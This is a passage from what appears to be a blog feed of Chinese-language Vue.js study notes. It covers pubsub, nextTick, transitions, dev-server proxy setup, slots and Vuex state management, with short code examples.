<li>A組件想接收數據，則在A組件中訂閱消息，訂閱的回調留在A組件自身中 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">methods</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">demo</span>(<span class="params">data</span>)&#123;...&#125;</span><br><span class="line">&#125;,</span><br><span class="line">...</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">pid</span> = pubsub.<span class="title function_">subscribe</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">pid</span> = pubsub.<span class="title function_">subscribe</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="function">(<span class="params">parameters</span>) =&gt;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">beforeDestory</span>(<span class="params"></span>)&#123;</span><br><span class="line">    pubsub.<span class="title function_">unsubscribe</span>(<span class="variable language_">this</span>.<span class="property">pid</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>提供數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pubsub.<span class="title function_">publish</span>(<span class="string">&#x27;xxx&#x27;</span>, data)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h2><ol>
<li><p>解析順序的問題：</p>
<ul>
<li>使用<code>v-show</code>時，由於元素在調用函數時並沒有來到頁面上，因此對元素的操作無效</li>
<li>案例：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;!-- 點擊按鈕時出現input框並獲取焦點 --&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-show=&quot;item.isEdit&quot; ref=&quot;inputTitle&quot;&gt;</span><br><span class="line">        &lt;button @click=&quot;handleEdit(item)&quot;&gt;Edit&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    methods:&#123;</span><br><span class="line">        handleEdit(item)&#123;</span><br><span class="line">            if(item.hasOwnProperty(&#x27;isEdit&#x27;))&#123;</span><br><span class="line">                item.isEdit = true</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                this.$set(item, &#x27;isEdit&#x27;, true)</span><br><span class="line">            &#125;</span><br><span class="line">            // 由於調用函數時，input框還沒有來到頁面上，因此無法獲取焦點</span><br><span class="line">            this.$refs.inputTitle.focus()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用<code>nextTick()</code>方法</p>
<ul>
<li>作用：在下一次DOM更新結束後，執行其指定代碼</li>
<li>當改變數據後，要基於更新後的新DOM進行某些操作時，要在<code>nextTick</code>所制定的回調函數中執行</li>
</ul>
</li>
<li><p>語法：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$nextTick(回調函數)</span><br></pre></td></tr></table></figure>

</li>
<li><p>具體代碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在DOM更新完畢後執行函數</span></span><br><span class="line"><span class="variable language_">this</span>.$nextTick(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// DOM更新完畢，input框已經在頁面上，就可以獲取焦點了</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">inputTitle</span>.<span class="title function_">focus</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="過渡與動畫"><a href="#過渡與動畫" class="headerlink" title="過渡與動畫"></a>過渡與動畫</h2><ol>
<li><p>作用：在插入、更新或移除DOM元素時，在合適的時候給元素添加樣式類名</p>
</li>
<li><p>語法：  </p>
<ol>
<li><p>樣式：  </p>
<ul>
<li><p>元素進入的樣式：</p>
<ol>
<li><code>v-enter</code> 進入的起點</li>
<li><code>v-enter-active</code> 進入過程中（進入的時候被激活）</li>
<li><code>v-enter-to</code> 進入的終點</li>
</ol>
</li>
<li><p>元素離開的樣式：</p>
<ol>
<li><code>v-leave</code> 離開的起點</li>
<li><code>v-leave-active</code> 離開過程中</li>
<li><code>v-leave-to</code> 離開的終點</li>
</ol>
</li>
</ul>
</li>
<li><p>使用<code>&lt;transition&gt;</code>包裹要過度的元素，並配置name屬性：</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;xxx&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>Hello<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> 樣式：</p>
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">xxx-enter&#123;...&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>備註：若有多個元素需要過渡，則需要使用<code>&lt;transition-group&gt;</code>，切每一個元素都要指定的<code>key</code>值</p>
</li>
</ol>
</li>
<li><p>其他：</p>
<ul>
<li>初始引入動畫，在<code>&lt;transition&gt;</code>中加入<code>appear</code></li>
</ul>
</li>
</ol>
<h2 id="動畫庫"><a href="#動畫庫" class="headerlink" title="動畫庫"></a>動畫庫</h2><ol>
<li><p>安裝：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install animate.<span class="property">css</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>引入：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;animate.css&#x27;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>使用：</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">name</span>=<span class="string">&quot;animate__animated animate__bounce&quot;</span></span></span><br><span class="line"><span class="tag">    &lt;!<span class="attr">--</span> <span class="attr">複製粘貼已配置的動畫名xxx</span> <span class="attr">--</span>&gt;</span></span><br><span class="line">    enter-active-class=&quot;xxx&quot;</span><br><span class="line">    leave-active-class=&quot;xxx&quot;</span><br><span class="line">&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://animate.style/&quot;</span>&gt;</span>animate.css官網<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>VueJS</category>
      </categories>
      <tags>
        <tag>VueJS</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - AJAX</title>
    <url>/myBlog/2022/06/20/2022/2022-6-20-VueJS-ajax/</url>
    <content><![CDATA[<h1 id="Vue-AJAX"><a href="#Vue-AJAX" class="headerlink" title="Vue AJAX"></a>Vue AJAX</h1><h2 id="Vue腳手架配置代理"><a href="#Vue腳手架配置代理" class="headerlink" title="Vue腳手架配置代理"></a>Vue腳手架配置代理</h2><ol>
<li><p>方法一：在<code>vue.config.js</code>中添加如下配置</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: <span class="string">&#x27;http://localhost:5001&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<ul>
<li>優點：配置簡單，請求資源時直接發給前端(8080)即可</li>
<li>缺點：不能配置多個代理，不能靈活的控制請求是否走代理</li>
<li>工作方式：若按照上述配置代理，當請求了前端不存在的資源時，那麼該請求會轉發給服務器（優先匹配前端資源）</li>
</ul>
</li>
<li><p>方法二：編寫<code>vue.config.js</code>配置具體代理規則</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;/api1&#x27;</span>: &#123;      <span class="comment">// 匹配所有以 &#x27;/api1&#x27; 開頭的請求路徑</span></span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5001&#x27;</span>,    <span class="comment">// 代理目標的基礎路徑</span></span><br><span class="line">            <span class="attr">pathRewrite</span>:&#123;<span class="string">&#x27;^/api1&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;,  </span><br><span class="line">            <span class="attr">ws</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;/api2&#x27;</span>: &#123;      <span class="comment">// 匹配所有以 &#x27;/api2&#x27; 開頭的請求路徑</span></span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5002&#x27;</span>,    <span class="comment">// 代理目標的基礎路徑</span></span><br><span class="line">            <span class="attr">pathRewrite</span>:&#123;<span class="string">&#x27;^/api2&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;,</span><br><span class="line">            <span class="attr">ws</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    changeOrigin設置為true時，服務器收到的請求頭中的host為：localhost:5001</span></span><br><span class="line"><span class="comment">    changeOrigin設置為false時，服務器收到的請求頭中的host為：localhost:8080</span></span><br><span class="line"><span class="comment">    changeOrigin默認值為true</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<ul>
<li>優點：可以配置多個代理，而且可以靈活的控制請求是否要走代理</li>
<li>缺點：配置略微繁瑣，請求資源時必須加前綴</li>
</ul>
</li>
</ol>
<h2 id="插槽slot"><a href="#插槽slot" class="headerlink" title="插槽slot"></a>插槽slot</h2><ol>
<li><p>作用：</p>
<ol>
<li>默認插槽、具名插槽：讓父組件可以向子組件指定位置插入html結構</li>
<li>作用域插槽：可以是一種通信方式，適用於父組件 -&gt; 子組件</li>
</ol>
</li>
<li><p>默認插槽：</p>
<ul>
<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Category&gt;</span><br><span class="line">        &lt;div&gt; HTML結構 &lt;/div&gt;</span><br><span class="line">    &lt;/Category&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;!-- 定義插槽 --&gt;</span><br><span class="line">        &lt;slot&gt; 插槽默認內容 &lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>具名插槽：</p>
<ul>
<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Category&gt;</span><br><span class="line">        &lt;!-- 方式一 --&gt;</span><br><span class="line">        &lt;template slot=&quot;slotName1&quot;&gt;</span><br><span class="line">            &lt;div&gt; HTML結構1 &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">        &lt;!-- 方式二 --&gt;</span><br><span class="line">        &lt;template v-slot:slotName2&gt;</span><br><span class="line">            &lt;div&gt; HTML結構2 &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">    &lt;/Category&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;!-- 定義插槽 --&gt;</span><br><span class="line">        &lt;slot name=&quot;slotName1&quot;&gt; 插槽默認內容 &lt;/slot&gt;</span><br><span class="line">        &lt;slot name=&quot;slotName2&quot;&gt; 插槽默認內容 &lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>作用域插槽</p>
<ul>
<li><p>理解：<font color="#f54747">當數據在組件的自身<font color="green">(子組件)</font>，但根據數據生成的結構需要組件的使用者<font color="green">(父組件)</font>來決定</font></p>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;Category&gt;</span><br><span class="line">        &lt;template scope=&quot;scopeData&quot;&gt;</span><br><span class="line">            &lt;!-- 生成ul列表 --&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">                &lt;li v-for=&quot;(item,index) in scopeData.games&quot; :key=&quot;index&quot;&gt;&#123;&#123;item&#125;&#125;&lt;li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">    &lt;/Category&gt;</span><br><span class="line">    &lt;Category&gt;</span><br><span class="line">        &lt;template scope=&quot;scopeData&quot;&gt;</span><br><span class="line">            &lt;!-- 生成h4標題 --&gt;</span><br><span class="line">            &lt;h4 v-for=&quot;(item,index) in scopeData.games&quot; :key=&quot;index&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/h4&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">    &lt;/Category&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name:&#x27;Category&#x27;,</span><br><span class="line">        props:[&#x27;title&#x27;],</span><br><span class="line">        // 數據在子組件中</span><br><span class="line">        data()&#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                games:[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; ,&#x27;d&#x27;]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>VueJS</category>
      </categories>
      <tags>
        <tag>VueJS</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - Vuex</title>
    <url>/myBlog/2022/06/25/2022/2022-6-25-VueJS-Vuex/</url>
    <content><![CDATA[<h1 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h1><h2 id="Vuex簡介"><a href="#Vuex簡介" class="headerlink" title="Vuex簡介"></a>Vuex簡介</h2><ol>
<li><p>概念：<br> 專門在Vue中實現<font color="#f54747">集中式數據(狀態)管理</font>的一個Vue插件，對Vue應用中多個組件的共享數據(狀態)進行集中式的管理(讀&#x2F;寫)，也是一種組件間通信的方式，適用於任意組件中的通信</p>
</li>
<li><p>什麼時候使用Vuex<br> a. 多個組件依賴於同一數據<br> b. 來自不同組件的行為需要變更同一數據</p>
</li>
</ol>
<h2 id="Vue工作原理"><a href="#Vue工作原理" class="headerlink" title="Vue工作原理"></a>Vue工作原理</h2><img src="https://p.ipic.vip/6sd35u.png" alt="vuex"/>

<ol>
<li><p><code>Vue Components</code>：組件，發送操作</p>
<ul>
<li>通過調用<code>dispatch()</code>方法向Vuex傳遞要執行的操作  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、要進行的操作</span></span><br><span class="line"><span class="comment">// 參數二、操作所需的數據</span></span><br><span class="line"><span class="title function_">dispatch</span>(<span class="string">&#x27;add&#x27;</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>Actions</code>：一個對象，用於保存動作、行為</p>
<ul>
<li>裏面存有操作所對應的 <font color="skyblue">方法</font><code>add:function()&#123;...&#125;</code></li>
<li>在函數裡調用<code>commit()</code>方法向Mutations傳遞數據  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、要進行的操作</span></span><br><span class="line"><span class="comment">// 參數二、操作所需的數據</span></span><br><span class="line"><span class="title function_">commit</span>(<span class="string">&#x27;add&#x27;</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>Mutations</code>：一個對象，用於修改、更新數據</p>
<ul>
<li>裏面存有操作所對應的 <font color="skyblue">初始化的State 和 操作的數據</font></li>
<li>通過以下方式更改保存在State中的數據，進行數據的更新  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">state.<span class="property">sum</span> += <span class="number">2</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>State</code>：一個對象，用於保存數據</p>
<ul>
<li>當數據更新完後，Vuex會重新解析和渲染頁面上的動態數據</li>
</ul>
</li>
</ol>
<h2 id="搭建Vuex環境"><a href="#搭建Vuex環境" class="headerlink" title="搭建Vuex環境"></a>搭建Vuex環境</h2><ol>
<li><p>創建<code>store</code>：</p>
<ul>
<li>創建文件：<code>src/store/index.js</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入Vue核心庫</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// 引入Vuex</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">// 應用Vuex插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 準備actions，用於響應組件中的動作</span></span><br><span class="line"><span class="keyword">const</span> actions = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 準備mutations，用於操作數據(state)</span></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 準備state，用於存儲數據</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建並暴露store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    actions,</span><br><span class="line">    mutations,</span><br><span class="line">    state</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>配置<code>store</code>：</p>
<ul>
<li>在<code>main.js</code>中創建<code>vm</code>時傳入<code>store</code>配置項  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store/index.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="comment">// 配置store</span></span><br><span class="line">    store,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Vuex基本使用"><a href="#Vuex基本使用" class="headerlink" title="Vuex基本使用"></a>Vuex基本使用</h2><ol>
<li><p>初始化數據，配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入Vue</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// 引入Vuex</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="comment">// 使用vuex插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">    <span class="title function_">add</span>(<span class="params">context,value</span>)&#123;</span><br><span class="line">        context.<span class="title function_">commit</span>(<span class="string">&#x27;ADD&#x27;</span>, value)</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">    <span class="title function_">ADD</span>(<span class="params">state,value</span>)&#123;</span><br><span class="line">        state.<span class="property">sum</span> += value</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化數據</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">    <span class="attr">sum</span>:<span class="number">0</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    actions,</span><br><span class="line">    mutations,</span><br><span class="line">    state,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>組件中讀取vuex的數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$store.<span class="property">state</span>.<span class="property">sum</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>組件中修改vuex中的數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$store.<span class="title function_">dispatch</span>(<span class="string">&#x27;actionName&#x27;</span>, data)     <span class="comment">// 透過actions修改數據</span></span><br><span class="line">$store.<span class="title function_">commit</span>(<span class="string">&#x27;mutationsName&#x27;</span>, data)    <span class="comment">// 跳過actions，直接聯繫mutations修改</span></span><br></pre></td></tr></table></figure>
<ul>
<li>備註：若沒有網絡請求或其他邏輯，則可直接使用<code>commit</code>修改數據</li>
</ul>
</li>
</ol>
<h2 id="getters的使用"><a href="#getters的使用" class="headerlink" title="getters的使用"></a>getters的使用</h2><ol>
<li><p>概念：當<code>state</code>中的數據需要進行加工後再使用，可以使用getters加工</p>
</li>
<li><p>在<code>store.js</code>中追加<code>getters</code>配置</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">    <span class="title function_">tenTimes</span>(<span class="params">state</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> state.<span class="property">sum</span> * <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    ...</span><br><span class="line">    getters,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>組件中讀取數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$store.<span class="property">getters</span>.<span class="property">tenTimes</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="四種map方法的使用"><a href="#四種map方法的使用" class="headerlink" title="四種map方法的使用"></a>四種map方法的使用</h2><ol>
<li><p><code>mapState</code>方法：用於映射<code>state</code>中的數據為計算屬性</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 借助 mapState 生成計算屬性，從state中讀取數據（對象寫法）</span></span><br><span class="line">    ...<span class="title function_">mapState</span>(&#123;<span class="attr">a</span>:<span class="string">&#x27;sum&#x27;</span>, <span class="attr">b</span>:<span class="string">&#x27;school&#x27;</span>, <span class="attr">c</span>:<span class="string">&#x27;major&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 借助 mapState 生成計算屬性，從state中讀取數據（數組寫法）</span></span><br><span class="line">    ...<span class="title function_">mapState</span>([<span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;school&#x27;</span>, <span class="string">&#x27;major&#x27;</span>]),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>mapGetters</code>方法：用於映射<code>getters</code>中的數據為計算屬性</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 借助 mapGetters 生成計算屬性，從getters中讀取數據（對象寫法）</span></span><br><span class="line">    ...<span class="title function_">mapGetters</span>(&#123;<span class="attr">tenTimes</span>:<span class="string">&#x27;tenTimes&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 借助 mapGetters 生成計算屬性，從getters中讀取數據（數組寫法）</span></span><br><span class="line">    ...<span class="title function_">mapGetters</span>([<span class="string">&#x27;tenTimes&#x27;</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>mapActions</code>方法：用於生成與<code>actions</code>對話的方法，即包含<code>$store.dispatch(xxx)</code>的函數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 借助 mapActions 生成對應的方法，方法中會調用dispatch去聯繫actions（對象的寫法）</span></span><br><span class="line">    ...<span class="title function_">mapActions</span>(&#123;<span class="attr">incrementOdd</span>:<span class="string">&#x27;addOdd&#x27;</span>, <span class="attr">incrementWait</span>:<span class="string">&#x27;addWait&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 借助 mapActions 生成對應的方法，方法中會調用dispatch去聯繫actions（對象的寫法）</span></span><br><span class="line">    ...<span class="title function_">mapActions</span>([<span class="string">&#x27;addOdd&#x27;</span>, <span class="string">&#x27;addWait&#x27;</span>]),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>mapMutations</code>方法：用於生成與<code>mutations</code>對話的方法，即包含<code>$store.commit(xxx)</code>的函數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 借助 mapMutations 生成對應的方法，方法中會調用commit去聯繫mutations（對象的寫法）</span></span><br><span class="line">    ...<span class="title function_">mapMutations</span>(&#123;<span class="attr">increment</span>:<span class="string">&#x27;ADD&#x27;</span>, <span class="attr">decrement</span>:<span class="string">&#x27;MINUS&#x27;</span>&#125;),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 借助 mapMutations 生成對應的方法，方法中會調用commit去聯繫mutations（數組的寫法）</span></span><br><span class="line">    ...<span class="title function_">mapMutations</span>([<span class="string">&#x27;ADD&#x27;</span>, <span class="string">&#x27;MINUS&#x27;</span>]),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>備註：<code>mapActions</code> 與 <code>mapMutations</code> 使用時，若需要傳遞參數，<font color="#f54747">需要在模板中綁定事件時傳遞參數</font>，否則參數是默認的事件對象</p>
</li>
</ol>
<h2 id="Vuex模塊化及命名空間"><a href="#Vuex模塊化及命名空間" class="headerlink" title="Vuex模塊化及命名空間"></a>Vuex模塊化及命名空間</h2><ol>
<li><p>目的：讓代碼更好維護，讓更多數據分類明確</p>
</li>
<li><p>修改<code>store.js</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> countAbout = &#123;</span><br><span class="line">    <span class="attr">namespaced</span>:<span class="literal">true</span>     <span class="comment">// 開啟命名空間</span></span><br><span class="line">    <span class="attr">state</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">actions</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">mutations</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">getters</span>:&#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> personAbout = &#123;</span><br><span class="line">    <span class="attr">namespaced</span>:<span class="literal">true</span>     <span class="comment">// 開啟命名空間</span></span><br><span class="line">    <span class="attr">state</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">actions</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">mutations</span>:&#123;...&#125;,</span><br><span class="line">    <span class="attr">getters</span>:&#123;...&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    <span class="attr">modules</span>:&#123;</span><br><span class="line">        countAbout,</span><br><span class="line">        personAbout,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>開啟命名空間後，組件中讀取<code>state</code>數據：</p>
